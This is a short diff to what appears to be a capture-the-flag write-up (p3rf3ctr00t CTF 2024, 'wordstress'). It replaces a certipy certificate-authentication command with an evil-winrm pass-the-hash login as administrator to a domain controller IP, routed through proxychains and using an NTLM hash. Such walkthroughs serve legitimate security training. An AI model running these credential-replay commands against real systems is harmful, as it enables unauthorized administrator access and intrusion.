@@ -230,7 +230,7 @@ proxychains -q certipy auth -pfx administrator_dc.pfx -dc-ip 94.72.112.254
 
 
 ```sh
-proxychains -q certipy auth -pfx administrator_dc.pfx -dc-ip 94.72.112.254
+proxychains -q evil-winrm -i 94.72.112.254 -u administrator -H d8dabcadf488114f7c5a46604fb26235
 ```
 
 {{< image src="/img/p3rf3ctr00t_ctf_2024/wordstress_29.png" alt="" position="center" style="border-radius: 8px;" >}}
